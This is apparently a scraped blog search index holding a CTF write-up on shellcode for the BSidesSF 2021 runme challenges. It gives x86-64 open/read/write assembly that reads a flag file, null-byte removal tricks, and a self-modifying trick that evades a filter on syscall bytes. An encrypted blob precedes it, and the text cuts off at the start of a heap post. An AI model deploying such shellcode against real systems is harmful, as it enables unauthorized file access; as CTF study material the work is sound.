U2FsdGVkX1+Q9BUjR5u/gkRWNlhhTYqzAVtpirqv/CaFK9ZXrvOYw3Er1GvaSSxlHUIRHX7uXLmIKRrWoGpc64QIvsBGz1YSOR/7qt1cxpt1l7GI+zC0f9HF2P8Y/8fFMK5YAsEvgIgDzyPDf8fwC0rwRZaS69ZmBTSoMDrpdZIIKHOhDN1+ylx+tfDhdqvvLAXDwsvzXlxr1JcpJbbeh7NzABX4suY3tLm83/WuERJJRkw1qu9Woh2TLnI4xzYTQ7c9P5k09NfcP+jytAYhDnY/GFDZKbaa5FDFE7RF6urKaVFndyZmZkT+LPViB/Ku2VhW0w4S0bBvD6kyy7HQV0pJmQu/uwGPTnenrcq/Hxf5i6kDycQLctDa6p//ZbTpUB+Q1hbiOnCbtC7q5K2H1exWZgbU1wKtJ4DLZLKrnyBR5LcxcTzmr9cgNxqjee/nnsz5iahkr12HQCDYF2GXvtkjORDK4BloyNw5IGbNjZHndPRbDdmDpgeWekmk+UMsH2ShEvl1aS4+zsQ1O97gG0iGY5K0unReW5Ga3tSxguRAx0YrQzK3DRWT9dxNt7nL0KfFrW2t29AoRawpdACu0zPRsMufxNHjnMMtogpEThZeHh+MnS1OVzxSFrm1FPZ7W7/IFGAx9Q8ddrwWcKi8Ap70VW+O8NZ74SynFXB47CHRLtMxRgj39EmOM0ft3fFUcE6RuOhzDeZoKn9ZlQcMQg== </div>","categories":[],"tags":["PWN"]},{"title":"shellcode","url":"https://pz1o.top/2021/03/21/shellcode/","content":"<p></p>\n<p>[][<a href=\"https://blog.skullsecurity.org/2021/bsidessf-ctf-2021-author-writeup-shellcode-primer-runme-runme2-and-runme3]\" target=\"_blank\" rel=\"noopener\">https://blog.skullsecurity.org/2021/bsidessf-ctf-2021-author-writeup-shellcode-primer-runme-runme2-and-runme3]</a></p>\n<h1 id=\"0x01-method\"><a href=\"#0x01-method\" class=\"headerlink\" title=\"0x01 method\"></a>0x01 method</h1><h2 id=\"nasm\"><a href=\"#nasm\" class=\"headerlink\" title=\"nasm\"></a>nasm</h2><p>nasm</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">whereis nasm</span><br><span class=\"line\">&#x2F;&#x2F;</span><br><span class=\"line\">sudo apt-get install nasm</span><br></pre></td></tr></table></figure>\n<p></p>\n<p>hello,world</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">; hello.asm </span><br><span class=\"line\">section .data            ; </span><br><span class=\"line\">        msg db &quot;Hello, world!&quot;, 0xA     ; </span><br><span class=\"line\">        len equ $ - msg                 ; </span><br><span class=\"line\">section .text            ; </span><br><span class=\"line\">global main            ; </span><br><span class=\"line\">main:                  ; </span><br><span class=\"line\">        mov edx, len     ; </span><br><span class=\"line\">        mov ecx, msg     ; </span><br><span class=\"line\">        mov ebx, 1       ; (stdout) </span><br><span class=\"line\">        mov eax, 4       ; (sys_write) </span><br><span class=\"line\">        int 0x80         ; </span><br><span class=\"line\">                         ; </span><br><span class=\"line\">        mov ebx, 0       ; </span><br><span class=\"line\">        mov eax, 1       ; (sys_exit) </span><br><span class=\"line\">        int 0x80         ; </span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nasm -f elf32 hello.asm -o hello.o</span><br><span class=\"line\">&#x2F;&#x2F;nasm -f [] [] -o []</span><br><span class=\"line\">gcc -m32 hello.o -o hello</span><br></pre></td></tr></table></figure>\n<p>hello,world</p>\n<p></p>\n<p></p>\n<p>objdump,objcopy</p>\n<p>objcopy</p>\n<p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">objcopy -O binary hello.o code</span><br><span class=\"line\">xxd -i code</span><br></pre></td></tr></table></figure>\n<p>shellcode</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pz1o@pz1o:~&#x2F;$ xxd -i code</span><br><span class=\"line\">unsigned char code[] &#x3D; &#123;</span><br><span class=\"line\">  0xba, 0x0e, 0x00, 0x00, 0x00, 0xb9, 0x00, 0x00, 0x00, 0x00, 0xbb, 0x01,</span><br><span class=\"line\">  0x00, 0x00, 0x00, 0xb8, 0x04, 0x00, 0x00, 0x00, 0xcd, 0x80, 0xbb, 0x00,</span><br><span class=\"line\">  0x00, 0x00, 0x00, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xcd, 0x80</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">unsigned int code_len &#x3D; 34;</span><br></pre></td></tr></table></figure>\n<h1 id=\"0x02-challenge\"><a href=\"#0x02-challenge\" class=\"headerlink\" title=\"0x02 challenge\"></a>0x02 challenge</h1><p>challenge64</p>\n<p>rdi rsi rdx</p>\n<p>shellcode</p>\n<p>CTF/bin/shflagORW</p>\n<p>ORW(open read write)</p>\n<h2 id=\"runme1\"><a href=\"#runme1\" class=\"headerlink\" title=\"runme1\"></a>runme1</h2><p>shellcode</p>\n<p></p>\n<p>ORW</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bits 64</span><br><span class=\"line\"></span><br><span class=\"line\">;;; OPEN</span><br><span class=\"line\"></span><br><span class=\"line\">  mov rax, 2 ; Syscall 2 &#x3D; sys_open</span><br><span class=\"line\">  call getfilename ; Pushes the next address onto the stack and jumps down</span><br><span class=\"line\">  db &quot;&#x2F;home&#x2F;ctf&#x2F;flag.txt&quot;,0 ; The literal flag, null terminated</span><br><span class=\"line\">getfilename:</span><br><span class=\"line\">  pop rdi ; Pop the top of the stack (which is the filename) into rdi</span><br><span class=\"line\">  mov rsi, 0 ; Flags &#x3D; 0</span><br><span class=\"line\">  mov rdx, 0 ; Mode &#x3D; 0</span><br><span class=\"line\">  syscall ; Perform sys_open() syscall, the file handle is returned in rax</span><br><span class=\"line\"></span><br><span class=\"line\">;;; READ</span><br><span class=\"line\"></span><br><span class=\"line\">  push rdi ; Temporarly store the filename pointer</span><br><span class=\"line\">  push rax ; Temporarily store the handle</span><br><span class=\"line\"></span><br><span class=\"line\">  mov rax, 0 ; Syscall 0 &#x3D; sys_read</span><br><span class=\"line\">  pop rdi ; Move the file handle into rdi</span><br><span class=\"line\">  pop rsi ; Use the same buffer where the filename pointer is stored (it&#39;s readable and writable)</span><br><span class=\"line\">  mov rdx, 30 ; rdx is the count</span><br><span class=\"line\">  syscall ; Perform sys_read() syscall, reading from the opened file</span><br><span class=\"line\"></span><br><span class=\"line\">;;; WRITE</span><br><span class=\"line\"></span><br><span class=\"line\">  mov rax, 1 ; Syscall 1 &#x3D; sys_write</span><br><span class=\"line\">  mov rdi, 1 ; File handle to write to &#x3D; stdout &#x3D; 1</span><br><span class=\"line\">  ; (rsi is already the buffer)</span><br><span class=\"line\">  mov rdx, 30 ; rdx is the count again</span><br><span class=\"line\">  syscall ; Perform the sys_write syscall, writing the data to stdout</span><br><span class=\"line\"></span><br><span class=\"line\">;;; EXIT</span><br><span class=\"line\">  mov rax, 60 ; Syscall 60 &#x3D; exit</span><br><span class=\"line\">  mov rdi, 0 ; Exit with code 0</span><br><span class=\"line\">  syscall ; Perform an exit</span><br></pre></td></tr></table></figure>\n<h2 id=\"runme2\"><a href=\"#runme2\" class=\"headerlink\" title=\"runme2\"></a>runme2</h2><p>challenge</p>\n<p>shellcode</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pz1o@pz1o:~&#x2F;$ ndisasm -b64 1</span><br><span class=\"line\">00000000  B802000000        mov eax,0x2</span><br><span class=\"line\">00000005  E813000000        call qword 0x1d</span><br><span class=\"line\">0000000A  2F                db 0x2f</span><br><span class=\"line\">0000000B  686F6D652F        push qword 0x2f656d6f</span><br><span class=\"line\">00000010  63                db 0x63</span><br><span class=\"line\">00000011  7466              jz 0x79</span><br><span class=\"line\">00000013  2F                db 0x2f</span><br><span class=\"line\">00000014  666C              o16 insb</span><br><span class=\"line\">00000016  61                db 0x61</span><br><span class=\"line\">00000017  672E7478          cs jz 0x93</span><br><span class=\"line\">0000001B  7400              jz 0x1d</span><br><span class=\"line\">0000001D  5F                pop rdi</span><br><span class=\"line\">0000001E  BE00000000        mov esi,0x0</span><br><span class=\"line\">00000023  BA00000000        mov edx,0x0</span><br><span class=\"line\">00000028  0F05              syscall</span><br><span class=\"line\">0000002A  57                push rdi</span><br><span class=\"line\">0000002B  50                push rax</span><br><span class=\"line\">0000002C  B800000000        mov eax,0x0</span><br><span class=\"line\">00000031  5F                pop rdi</span><br><span class=\"line\">00000032  5E                pop rsi</span><br><span class=\"line\">00000033  BA1E000000        mov edx,0x1e</span><br><span class=\"line\">00000038  0F05              syscall</span><br><span class=\"line\">0000003A  B801000000        mov eax,0x1</span><br><span class=\"line\">0000003F  BF01000000        mov edi,0x1</span><br><span class=\"line\">00000044  BA1E000000        mov edx,0x1e</span><br><span class=\"line\">00000049  0F05              syscall</span><br><span class=\"line\">0000004B  B83C000000        mov eax,0x3c</span><br><span class=\"line\">00000050  BF00000000        mov edi,0x0</span><br><span class=\"line\">00000055  0F05              syscall</span><br></pre></td></tr></table></figure>\n<p>000</p>\n<p>0</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00000005  E813000000        call qword 0x1d</span><br><span class=\"line\">&#x2F;&#x2F;call A+0x13 &#x3D; call 0x1d</span><br></pre></td></tr></table></figure>\n<p>call00jmp</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00000005  EB13              jmp short 0x1d</span><br></pre></td></tr></table></figure>\n<p>calling backwards</p>\n<p>trick</p>\n<ol>\n<li>mov REG,0 ==&gt;xor REG,REG</li>\n<li>rax==&gt;al</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bits 64</span><br><span class=\"line\"></span><br><span class=\"line\">;;; OPEN</span><br><span class=\"line\"></span><br><span class=\"line\">  ; Syscall 2 &#x3D; sys_open</span><br><span class=\"line\">  xor rax, rax</span><br><span class=\"line\">  mov al, 2</span><br><span class=\"line\"></span><br><span class=\"line\">  ; rdi &#x3D; filename</span><br><span class=\"line\">  jmp short getfilename_bottom</span><br><span class=\"line\">getfilename_top:</span><br><span class=\"line\">  pop rdi ; Pop the top of the stack (which is the filename) into rdi</span><br><span class=\"line\"></span><br><span class=\"line\">  ; rsi &#x3D; flags</span><br><span class=\"line\">  xor rsi, rsi</span><br><span class=\"line\"></span><br><span class=\"line\">  ; rdx &#x3D; mode</span><br><span class=\"line\">  xor rdx, rdx</span><br><span class=\"line\"></span><br><span class=\"line\">  ; Perform sys_open() syscall, the file handle is returned in rax</span><br><span class=\"line\">  syscall</span><br><span class=\"line\"></span><br><span class=\"line\">;;; READ</span><br><span class=\"line\"></span><br><span class=\"line\">  push rdi ; Temporarly store the filename pointer</span><br><span class=\"line\">  push rax ; Temporarily store the handle</span><br><span class=\"line\"></span><br><span class=\"line\">  ; Syscall 0 &#x3D; sys_read</span><br><span class=\"line\">  xor rax, rax</span><br><span class=\"line\"></span><br><span class=\"line\">  ; rdi &#x3D; file handle</span><br><span class=\"line\">  pop rdi</span><br><span class=\"line\"></span><br><span class=\"line\">  ; rsi &#x3D; buffer (same as filename)</span><br><span class=\"line\">  pop rsi</span><br><span class=\"line\"></span><br><span class=\"line\">  ; rdx &#x3D; count</span><br><span class=\"line\">  xor rdx, rdx</span><br><span class=\"line\">  mov dl, 30</span><br><span class=\"line\"></span><br><span class=\"line\">  ; Perform sys_read() syscall, reading from the opened file</span><br><span class=\"line\">  syscall</span><br><span class=\"line\"></span><br><span class=\"line\">;;; WRITE</span><br><span class=\"line\"></span><br><span class=\"line\">  ; Syscall 1 &#x3D; sys_write</span><br><span class=\"line\">  xor rax, rax</span><br><span class=\"line\">  inc rax</span><br><span class=\"line\"></span><br><span class=\"line\">  ; File handle to write to &#x3D; stdout &#x3D; 1</span><br><span class=\"line\">  xor rdi, rdi</span><br><span class=\"line\">  inc rdi</span><br><span class=\"line\"></span><br><span class=\"line\">  ; (rsi is already the buffer)</span><br><span class=\"line\"></span><br><span class=\"line\">  ; rdx is the count again</span><br><span class=\"line\">  xor rdx, rdx</span><br><span class=\"line\">  mov dl, 30</span><br><span class=\"line\"></span><br><span class=\"line\">  ; Perform the sys_write syscall, writing the data to stdout</span><br><span class=\"line\">  syscall</span><br><span class=\"line\"></span><br><span class=\"line\">;;; EXIT</span><br><span class=\"line\">  ; Syscall 60 &#x3D; exit</span><br><span class=\"line\">  xor rax, rax</span><br><span class=\"line\">  mov al, 60</span><br><span class=\"line\"></span><br><span class=\"line\">  ; Exit with code 0</span><br><span class=\"line\">  xor rdi, rdi</span><br><span class=\"line\"></span><br><span class=\"line\">  ; Perform an exit</span><br><span class=\"line\">  syscall</span><br><span class=\"line\"></span><br><span class=\"line\">getfilename_bottom:</span><br><span class=\"line\">  call getfilename_top</span><br><span class=\"line\"></span><br><span class=\"line\">  db &quot;&#x2F;home&#x2F;ctf&#x2F;flag.txt&quot; ; The literal flag, fortunately the buffer itself is null-filled so we don&#39;t need to null terminate</span><br></pre></td></tr></table></figure>\n<p>00</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pz1o@pz1o:~&#x2F;$ ndisasm -b64 a</span><br><span class=\"line\">00000000  4831C0            xor rax,rax</span><br><span class=\"line\">00000003  B002              mov al,0x2</span><br><span class=\"line\">00000005  EB34              jmp short 0x3b</span><br><span class=\"line\">00000007  5F                pop rdi</span><br><span class=\"line\">00000008  4831F6            xor rsi,rsi</span><br><span class=\"line\">0000000B  4831D2            xor rdx,rdx</span><br><span class=\"line\">0000000E  0F05              syscall</span><br><span class=\"line\">00000010  57                push rdi</span><br><span class=\"line\">00000011  50                push rax</span><br><span class=\"line\">00000012  4831C0            xor rax,rax</span><br><span class=\"line\">00000015  5F                pop rdi</span><br><span class=\"line\">00000016  5E                pop rsi</span><br><span class=\"line\">00000017  4831D2            xor rdx,rdx</span><br><span class=\"line\">0000001A  B21E              mov dl,0x1e</span><br><span class=\"line\">0000001C  0F05              syscall</span><br><span class=\"line\">0000001E  4831C0            xor rax,rax</span><br><span class=\"line\">00000021  48FFC0            inc rax</span><br><span class=\"line\">00000024  4831FF            xor rdi,rdi</span><br><span class=\"line\">00000027  48FFC7            inc rdi</span><br><span class=\"line\">0000002A  4831D2            xor rdx,rdx</span><br><span class=\"line\">0000002D  B21E              mov dl,0x1e</span><br><span class=\"line\">0000002F  0F05              syscall</span><br><span class=\"line\">00000031  4831C0            xor rax,rax</span><br><span class=\"line\">00000034  B03C              mov al,0x3c</span><br><span class=\"line\">00000036  4831FF            xor rdi,rdi</span><br><span class=\"line\">00000039  0F05              syscall</span><br><span class=\"line\">0000003B  E8C7FFFFFF        call qword 0x7</span><br><span class=\"line\">00000040  2F                db 0x2f</span><br><span class=\"line\">00000041  686F6D652F        push qword 0x2f656d6f</span><br><span class=\"line\">00000046  63                db 0x63</span><br><span class=\"line\">00000047  7466              jz 0xaf</span><br><span class=\"line\">00000049  2F                db 0x2f</span><br><span class=\"line\">0000004A  666C              o16 insb</span><br><span class=\"line\">0000004C  61                db 0x61</span><br><span class=\"line\">0000004D  672E7478          cs jz 0xc9</span><br><span class=\"line\">00000051  74                db 0x74</span><br></pre></td></tr></table></figure>\n<h2 id=\"runme3\"><a href=\"#runme3\" class=\"headerlink\" title=\"runme3\"></a>runme3</h2><p><code>syscall</code>ban</p>\n<p><code>0f</code> <code>05</code></p>\n<p>trick</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bits 64</span><br><span class=\"line\"></span><br><span class=\"line\">; Jump down to the bottom, where we have the bytes for syscall (less 1) waiting</span><br><span class=\"line\">jmp short my_fake_syscall_bottom</span><br><span class=\"line\">  my_fake_syscall_top:</span><br><span class=\"line\">  pop rbx ; Pop the address of the syscall-minus-1 block into rbx</span><br><span class=\"line\">  add word [rbx], 0x0101 ; Increment the two bytes - 0x0e -&gt; 0x0f and 0x04 -&gt; 0x05</span><br><span class=\"line\"></span><br><span class=\"line\">  ; Now rbx points to &quot;syscall &#x2F; ret&quot;, so we can just call that any time we</span><br><span class=\"line\">  ; need a syscall!</span><br><span class=\"line\">  ;</span><br><span class=\"line\">  ; Other than changing &quot;syscall&quot; to &quot;call rbx&quot;, the rest is identical!</span><br><span class=\"line\"></span><br><span class=\"line\">;;; OPEN</span><br><span class=\"line\"></span><br><span class=\"line\">  ; Syscall 2 &#x3D; sys_open</span><br><span class=\"line\">  xor rax, rax</span><br><span class=\"line\">  mov al, 2</span><br><span class=\"line\"></span><br><span class=\"line\">  ; rdi &#x3D; filename</span><br><span class=\"line\">  jmp short getfilename_bottom</span><br><span class=\"line\">getfilename_top:</span><br><span class=\"line\">  pop rdi ; Pop the top of the stack (which is the filename) into rdi</span><br><span class=\"line\"></span><br><span class=\"line\">  ; rsi &#x3D; flags</span><br><span class=\"line\">  xor rsi, rsi</span><br><span class=\"line\"></span><br><span class=\"line\">  ; rdx &#x3D; mode</span><br><span class=\"line\">  xor rdx, rdx</span><br><span class=\"line\"></span><br><span class=\"line\">  ; Perform sys_open() syscall, the file handle is returned in rax</span><br><span class=\"line\">  call rbx</span><br><span class=\"line\"></span><br><span class=\"line\">;;; READ</span><br><span class=\"line\"></span><br><span class=\"line\">  push rdi ; Temporarly store the filename pointer</span><br><span class=\"line\">  push rax ; Temporarily store the handle</span><br><span class=\"line\"></span><br><span class=\"line\">  ; Syscall 0 &#x3D; sys_read</span><br><span class=\"line\">  xor rax, rax</span><br><span class=\"line\"></span><br><span class=\"line\">  ; rdi &#x3D; file handle</span><br><span class=\"line\">  pop rdi</span><br><span class=\"line\"></span><br><span class=\"line\">  ; rsi &#x3D; buffer (same as filename)</span><br><span class=\"line\">  pop rsi</span><br><span class=\"line\"></span><br><span class=\"line\">  ; rdx &#x3D; count</span><br><span class=\"line\">  xor rdx, rdx</span><br><span class=\"line\">  mov dl, 30</span><br><span class=\"line\"></span><br><span class=\"line\">  ; Perform sys_read() syscall, reading from the opened file</span><br><span class=\"line\">  call rbx</span><br><span class=\"line\"></span><br><span class=\"line\">;;; WRITE</span><br><span class=\"line\"></span><br><span class=\"line\">  ; Syscall 1 &#x3D; sys_write</span><br><span class=\"line\">  xor rax, rax</span><br><span class=\"line\">  inc rax</span><br><span class=\"line\"></span><br><span class=\"line\">  ; File handle to write to &#x3D; stdout &#x3D; 1</span><br><span class=\"line\">  xor rdi, rdi</span><br><span class=\"line\">  inc rdi</span><br><span class=\"line\"></span><br><span class=\"line\">  ; (rsi is already the buffer)</span><br><span class=\"line\"></span><br><span class=\"line\">  ; rdx is the count again</span><br><span class=\"line\">  xor rdx, rdx</span><br><span class=\"line\">  mov dl, 30</span><br><span class=\"line\"></span><br><span class=\"line\">  ; Perform the sys_write syscall, writing the data to stdout</span><br><span class=\"line\">  call rbx</span><br><span class=\"line\"></span><br><span class=\"line\">;;; EXIT</span><br><span class=\"line\">  ; Syscall 60 &#x3D; exit</span><br><span class=\"line\">  xor rax, rax</span><br><span class=\"line\">  mov al, 60</span><br><span class=\"line\"></span><br><span class=\"line\">  ; Exit with code 0</span><br><span class=\"line\">  xor rdi, rdi</span><br><span class=\"line\"></span><br><span class=\"line\">  ; Perform an exit</span><br><span class=\"line\">  call rbx</span><br><span class=\"line\"></span><br><span class=\"line\">my_fake_syscall_bottom:</span><br><span class=\"line\">  call my_fake_syscall_top</span><br><span class=\"line\"></span><br><span class=\"line\">  ; This little block will become &quot;syscall &#x2F; ret&quot;</span><br><span class=\"line\">  db 0x0e, 0x04 ; syscall is actually 0x0f 0x05</span><br><span class=\"line\">  ret ; Return after doing a syscall</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">getfilename_bottom:</span><br><span class=\"line\">  call getfilename_top</span><br><span class=\"line\"></span><br><span class=\"line\">  db &quot;.&#x2F;flag.txt&quot; ; The literal flag, fortunately the buffer itself is null-filled so we don&#39;t need to null terminate</span><br></pre></td></tr></table></figure>\n","categories":[],"tags":["shellcode"]},{"title":"tcache","url":"https://pz1o.top/2021/03/08/tcache/","content":"<p>downwiki</p>\n<h1 id=\"0x01-Introduction\"><a href=\"#0x01-Introduction\" class=\"headerlink\" title=\"0x01 Introduction\"></a>0x01 Introduction</h1><p>tcacheglibc 2.26(Ubuntu 17.10)</p>\n<h2 id=\"1-\"><a href=\"#1-\" class=\"headerlink\" title=\"1.\"></a>1.</h2><p><code>tcache_entry</code>  <code>tcache_perthread_struct</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span 